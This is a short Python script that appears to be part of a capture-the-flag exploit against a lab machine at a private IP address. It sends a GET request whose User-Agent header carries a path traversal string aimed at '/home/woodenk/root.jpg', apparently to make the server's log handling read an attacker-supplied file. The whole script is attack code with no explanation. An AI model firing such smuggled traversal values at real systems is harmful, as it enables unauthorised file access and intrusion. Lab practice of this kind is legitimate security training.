import requests

URL = "http://10.129.32.51:8080/"

HEADER = {
    'User-Agent': '||/../../../../../../../home/woodenk/root.jpg'
}
r = requests.get(URL, headers=HEADER)
print(r.text)